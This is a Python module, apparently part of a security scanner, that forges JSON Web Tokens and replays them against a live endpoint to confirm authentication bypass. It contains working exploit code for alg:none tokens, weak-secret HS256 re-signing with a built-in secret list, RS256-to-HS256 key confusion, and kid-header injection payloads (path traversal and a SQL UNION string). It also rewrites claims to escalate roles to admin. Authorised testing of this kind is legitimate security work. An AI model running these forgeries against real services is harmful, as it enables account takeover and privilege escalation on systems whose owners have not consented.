"""Dedicated JWT attack tester.

Most scanners stop at "a JWT is present". This module *demonstrates* exploitation:
it forges tokens and replays them against a real identity-reflecting endpoint,
confirming a vulnerability only when the server honours the forgery (the sentinel
identity is echoed back). Three classic high-yield techniques:

  * alg:none        — drop the signature, set the header alg to none/None/NONE.
  * weak HS256 secret — re-sign HS256 with a guessable secret (and, when a public
                        key is supplied, the RS256->HS256 key-confusion attack).
  * kid injection    — coerce the verifier toward a known/empty key via the kid
                        header (path traversal / predictable file), then sign to match.

A "confirmed" result is an authentication bypass: the app accepted a token we
signed (or didn't sign), under an identity we chose.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import httpx
import jwt as pyjwt

# Small, high-signal secret list for HS256 brute. Kept short on purpose — this is
# a confirmation probe, not a cracking rig; callers can extend via `extra_secrets`.
COMMON_HS256_SECRETS = [
    "secret", "secretkey", "secret key", "password", "changeme", "admin",
    "jwt", "jwtsecret", "key", "test", "123456", "supersecret",
    "your-256-bit-secret", "your_jwt_secret", "qwerty", "letmein",
]

# kid values that try to point the verifier at a known/empty/attacker key.
KID_PAYLOADS = [
    "../../../../../../dev/null",
    "/dev/null",
    "../../public/key.pub",
    "' UNION SELECT 'x'-- -",
]


def _b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _b64u_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


@dataclass
class JWTFinding:
    technique: str              # alg_none | weak_secret | kid_injection
    confirmed: bool
    detail: str
    sentinel: str
    secret: Optional[str] = None
    kid: Optional[str] = None
    forged_token: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)


class JWTTester:
    def __init__(
        self,
        verify_url: str,
        base_token: str,
        *,
        sentinel: str = "osop-forged@attacker.test",
        method: str = "GET",
        extra_secrets: Optional[List[str]] = None,
        public_key_pem: Optional[str] = None,
        timeout: float = 15.0,
    ):
        self.verify_url = verify_url
        self.base_token = base_token
        self.sentinel = sentinel
        self.method = method.upper()
        self.secrets = list(COMMON_HS256_SECRETS) + list(extra_secrets or [])
        self.public_key_pem = public_key_pem
        self.timeout = timeout
        self.header, self.payload = self._decode(base_token)

    @staticmethod
    def _decode(token: str) -> tuple[Dict[str, Any], Dict[str, Any]]:
        h, p, _ = token.split(".")
        return json.loads(_b64u_decode(h)), json.loads(_b64u_decode(p))

    def _forged_claims(self) -> Dict[str, Any]:
        """Copy the real claims, then stamp our sentinel identity in and escalate
        any role field — so a server that honours the token also reveals it did
        (the sentinel surfaces in the identity-reflecting response)."""
        claims = json.loads(json.dumps(self.payload))  # deep copy

        def walk(node: Any) -> None:
            if isinstance(node, dict):
                for k, v in node.items():
                    if isinstance(v, str) and "@" in v:
                        node[k] = self.sentinel
                    elif k.lower() in ("role", "isadmin", "admin"):
                        node[k] = "admin" if k.lower() == "role" else True
                    else:
                        walk(v)
            elif isinstance(node, list):
                for item in node:
                    walk(item)

        walk(claims)
        # Top-level fallbacks for flat tokens.
        for key in ("email", "sub", "username", "user"):
            if key in claims and isinstance(claims[key], str):
                claims[key] = self.sentinel
        return claims

    # ---- token forging primitives -------------------------------------------
    def _forge_alg_none(self, alg_label: str) -> str:
        hdr = {"typ": "JWT", "alg": alg_label}
        seg = _b64u(json.dumps(hdr, separators=(",", ":")).encode()) + "." + _b64u(
            json.dumps(self._forged_claims(), separators=(",", ":")).encode()
        )
        return seg + "."  # empty signature

    def _forge_hs256(self, secret: str, *, kid: Optional[str] = None) -> str:
        # PyJWT refuses an empty HMAC key, but an empty/known key is exactly the
        # kid-injection scenario (kid -> /dev/null). Sign manually so we can still
        # produce that token and test whether the server accepts it.
        if secret == "":
            return self._hs256_manual(b"", kid=kid)
        headers = {}
        if kid is not None:
            headers["kid"] = kid
        return pyjwt.encode(
            self._forged_claims(), secret, algorithm="HS256", headers=headers
        )

    def _hs256_manual(self, key: bytes, *, kid: Optional[str] = None) -> str:
        hdr = {"typ": "JWT", "alg": "HS256"}
        if kid is not None:
            hdr["kid"] = kid
        signing_input = (
            _b64u(json.dumps(hdr, separators=(",", ":")).encode())
            + "."
            + _b64u(json.dumps(self._forged_claims(), separators=(",", ":")).encode())
        )
        sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
        return signing_input + "." + _b64u(sig)

    # ---- replay / confirmation ----------------------------------------------
    async def _accepted(self, client: httpx.AsyncClient, token: str) -> tuple[bool, int, str]:
        """Replay a token; accepted == HTTP 200 AND the sentinel identity echoed."""
        headers = {"Authorization": f"Bearer {token}", "Cookie": f"token={token}"}
        try:
            resp = await client.request(self.method, self.verify_url, headers=headers)
        except Exception:
            return False, 0, ""
        body = resp.text
        return (resp.status_code == 200 and self.sentinel in body), resp.status_code, body[:200]

    async def run(self) -> List[JWTFinding]:
        findings: List[JWTFinding] = []
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=self.timeout) as client:
            # Sanity: confirm the verify endpoint actually reflects identity for a
            # *valid* token, otherwise our sentinel test can't distinguish anything.
            ok_valid, _, _ = await self._accepted(client, self.base_token)
            base_reflects = await self._baseline_reflects(client)

            # 1) alg:none (try several spellings — verifiers differ).
            for label in ("none", "None", "NONE", "nOnE"):
                try:
                    tok = self._forge_alg_none(label)
                    accepted, code, snip = await self._accepted(client, tok)
                except Exception:
                    continue
                if accepted:
                    findings.append(JWTFinding(
                        technique="alg_none", confirmed=True,
                        detail=f"Server accepted an unsigned token (alg='{label}') under a forged identity.",
                        sentinel=self.sentinel, forged_token=tok,
                        evidence={"alg_label": label, "status": code, "response_snippet": snip},
                    ))
                    break

            # 2) weak HS256 secret (and RS256->HS256 key confusion if pubkey known).
            secrets = list(self.secrets)
            if self.public_key_pem:
                secrets.insert(0, self.public_key_pem)
            for secret in secrets:
                try:
                    tok = self._forge_hs256(secret)
                    accepted, code, snip = await self._accepted(client, tok)
                except Exception:
                    continue
                if accepted:
                    label = "RS256->HS256 public-key confusion" if secret == self.public_key_pem else f"weak secret '{secret}'"
                    findings.append(JWTFinding(
                        technique="weak_secret", confirmed=True,
                        detail=f"Server accepted an HS256 token signed with {label}.",
                        sentinel=self.sentinel,
                        secret="<public-key>" if secret == self.public_key_pem else secret,
                        forged_token=tok,
                        evidence={"status": code, "response_snippet": snip},
                    ))
                    break

            # 3) kid injection — point verifier at an empty/known key, sign to match.
            for kid in KID_PAYLOADS:
                # /dev/null => empty key; sign HS256 with "" to match.
                try:
                    tok = self._forge_hs256("", kid=kid)
                    accepted, code, snip = await self._accepted(client, tok)
                except Exception:
                    continue
                if accepted:
                    findings.append(JWTFinding(
                        technique="kid_injection", confirmed=True,
                        detail=f"Server resolved a verification key from attacker-controlled kid '{kid}'.",
                        sentinel=self.sentinel, kid=kid, secret="", forged_token=tok,
                        evidence={"status": code, "response_snippet": snip},
                    ))
                    break

            _ = (ok_valid, base_reflects)  # retained for callers/debugging
        return findings

    async def _baseline_reflects(self, client: httpx.AsyncClient) -> bool:
        """True if the valid token's identity is visible at verify_url (so the
        endpoint is a usable oracle)."""
        headers = {"Authorization": f"Bearer {self.base_token}", "Cookie": f"token={self.base_token}"}
        try:
            resp = await client.request(self.method, self.verify_url, headers=headers)
            return resp.status_code == 200
        except Exception:
            return False
